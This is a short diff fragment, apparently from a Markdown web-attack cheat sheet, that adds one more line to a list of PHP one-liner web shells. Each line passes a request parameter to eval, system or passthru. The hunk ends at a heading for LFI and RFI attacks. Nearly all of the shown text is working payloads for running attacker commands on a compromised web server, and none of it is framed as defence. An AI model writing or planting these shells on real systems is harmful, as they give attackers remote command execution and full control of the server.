@@ -56,7 +56,10 @@ if __name__ == '__main__':
 <?php @eval($_POST['shell']);?>
 <?php @system($_POST["cmd"])?>
 <?php passthru($_GET['cmd']); ?>
+<? system($_GET["cmd"]); ?>
 ```
+
+
 
 ## LFI & RFI
 
